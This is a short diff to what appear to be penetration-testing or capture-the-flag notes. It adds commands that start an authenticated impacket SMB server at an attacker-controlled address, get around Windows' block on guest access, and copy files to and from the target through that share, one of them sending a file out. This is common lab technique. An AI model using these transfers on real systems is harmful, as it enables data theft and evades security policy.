@@ -80,3 +80,16 @@ $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
 New-PSDrive -Name "N" -Root "\\<ip>\<share_name>" -PSProvider "FileSystem" -Credential $
 ```
+
+Windows Message:
+
+`You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
+
+Do this:
+
+```bash
+impacket-smbserver -username gareth -password gareth share . -smb2support
+net use \\10.10.16.9\share /u:gareth gareth
+copy \\10.10.16.9\share\<file wanted>
+copy <file wanted> \\10.10.16.9\share
+```
